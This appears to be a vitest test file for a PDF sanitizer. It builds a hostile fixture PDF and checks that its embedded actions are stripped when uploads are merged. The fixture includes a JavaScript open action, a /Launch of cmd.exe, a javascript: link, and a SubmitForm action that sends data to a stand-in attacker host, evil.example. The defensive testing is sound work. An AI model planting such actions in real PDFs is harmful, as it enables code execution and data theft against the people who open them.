/**
 * P4-4 (remediation 2026-09): copyPages carries page-level /AA
 * JavaScript actions and /Launch, /JavaScript, /SubmitForm, /ImportData
 * annotation actions from uploaded PDFs into the export. The merge
 * sanitizes every uploaded document before copying its pages: the
 * catalog /OpenAction and /AA go, every page /AA goes, and an
 * annotation whose action subtype is dangerous loses the action key
 * (the annotation itself stays). A plain https link survives.
 */
import { describe, it, expect } from 'vitest';
import { PDFDocument, PDFName, PDFDict, PDFArray, PDFString } from 'pdf-lib';
import { sanitizePdfActions } from '@/lib/pdf-sanitize';
import { mergeAttachmentsIntoPdf, type MergeItem } from '@/lib/enclosure-attachments';

/** A one-page PDF carrying every action the sanitizer must strip, plus one it must keep. */
async function hostilePdf(): Promise<Uint8Array> {
  const doc = await PDFDocument.create();
  const page = doc.addPage([612, 792]);
  const ctx = doc.context;

  const jsAction = ctx.obj({ Type: 'Action', S: 'JavaScript', JS: PDFString.of('app.alert(1)') });
  // Page-level additional-actions: /O (page open) runs JavaScript.
  page.node.set(PDFName.of('AA'), ctx.obj({ O: jsAction }));
  // Catalog-level open action and additional actions.
  doc.catalog.set(PDFName.of('OpenAction'), jsAction);
  doc.catalog.set(PDFName.of('AA'), ctx.obj({ WC: jsAction }));

  const rect = [72, 72, 200, 100];
  const launch = ctx.obj({
    Type: 'Annot', Subtype: 'Link', Rect: rect,
    A: ctx.obj({ Type: 'Action', S: 'Launch', F: PDFString.of('cmd.exe') }),
  });
  const submit = ctx.obj({
    Type: 'Annot', Subtype: 'Link', Rect: rect,
    A: ctx.obj({ Type: 'Action', S: 'SubmitForm', F: PDFString.of('https://evil.example/collect') }),
  });
  const jsUri = ctx.obj({
    Type: 'Annot', Subtype: 'Link', Rect: rect,
    A: ctx.obj({ Type: 'Action', S: 'URI', URI: PDFString.of('javascript:alert(1)') }),
  });
  const annotAA = ctx.obj({
    Type: 'Annot', Subtype: 'Widget', Rect: rect,
    AA: ctx.obj({ Fo: jsAction }),
  });
  const safeLink = ctx.obj({
    Type: 'Annot', Subtype: 'Link', Rect: rect,
    A: ctx.obj({ Type: 'Action', S: 'URI', URI: PDFString.of('https://www.marines.mil/') }),
  });
  page.node.set(
    PDFName.of('Annots'),
    ctx.obj([ctx.register(launch), ctx.register(submit), ctx.register(jsUri), ctx.register(annotAA), ctx.register(safeLink)]),
  );
  return doc.save();
}

interface Found {
  pageAA: boolean;
  catalogOpenAction: boolean;
  catalogAA: boolean;
  annotSubtypes: string[];
  annotAA: number;
  annotCount: number;
}

/** Walks the last page of a document and reports what actions remain. */
async function inspect(bytes: Uint8Array): Promise<Found> {
  const doc = await PDFDocument.load(bytes);
  const page = doc.getPages()[doc.getPageCount() - 1];
  const annotSubtypes: string[] = [];
  let annotAA = 0;
  let annotCount = 0;
  const annots = page.node.lookup(PDFName.of('Annots'));
  if (annots instanceof PDFArray) {
    for (let i = 0; i < annots.size(); i++) {
      const annot = annots.lookup(i);
      if (!(annot instanceof PDFDict)) continue;
      annotCount += 1;
      const a = annot.lookup(PDFName.of('A'));
      if (a instanceof PDFDict) {
        const s = a.lookup(PDFName.of('S'));
        annotSubtypes.push(s instanceof PDFName ? s.decodeText() : '?');
      }
      if (annot.lookup(PDFName.of('AA')) instanceof PDFDict) annotAA += 1;
    }
  }
  return {
    pageAA: page.node.has(PDFName.of('AA')),
    catalogOpenAction: doc.catalog.has(PDFName.of('OpenAction')),
    catalogAA: doc.catalog.has(PDFName.of('AA')),
    annotSubtypes,
    annotAA,
    annotCount,
  };
}

describe('P4-4 sanitizePdfActions', () => {
  it('the crafted fixture carries the actions before sanitizing (round trip proves the leak)', async () => {
    const found = await inspect(await hostilePdf());
    expect(found.pageAA).toBe(true);
    expect(found.catalogOpenAction).toBe(true);
    expect(found.annotSubtypes).toEqual(['Launch', 'SubmitForm', 'URI', 'URI']);
    expect(found.annotAA).toBe(1);
  });

  it('strips catalog OpenAction/AA, page AA and dangerous annotation actions; keeps the annotation and an https link', async () => {
    const doc = await PDFDocument.load(await hostilePdf());
    const removed = sanitizePdfActions(doc);
    expect(removed).toBeGreaterThan(0);
    const found = await inspect(await doc.save());
    expect(found.pageAA).toBe(false);
    expect(found.catalogOpenAction).toBe(false);
    expect(found.catalogAA).toBe(false);
    expect(found.annotCount).toBe(5);
    expect(found.annotAA).toBe(0);
    expect(found.annotSubtypes).toEqual(['URI']);
  });

  it('is a no-op on a clean document', async () => {
    const doc = await PDFDocument.create();
    doc.addPage();
    expect(sanitizePdfActions(doc)).toBe(0);
  });

  it('mergeAttachmentsIntoPdf does not carry the actions into the export', async () => {
    const base = await PDFDocument.create();
    base.addPage([612, 792]);
    const hostile = await hostilePdf();
    const items: MergeItem[] = [{
      number: 1,
      attachment: {
        id: 'h', fileName: 'hostile.pdf', title: 'Hostile', mimeType: 'application/pdf',
        bytes: hostile.buffer.slice(hostile.byteOffset, hostile.byteOffset + hostile.byteLength) as ArrayBuffer,
      },
    }];
    const merged = await mergeAttachmentsIntoPdf(await base.save(), items, { coverPages: false });
    const found = await inspect(merged);
    expect(found.pageAA).toBe(false);
    expect(found.catalogOpenAction).toBe(false);
    expect(found.annotSubtypes).toEqual(['URI']);
    expect(found.annotAA).toBe(0);
    expect(found.annotCount).toBe(5);
  });
});
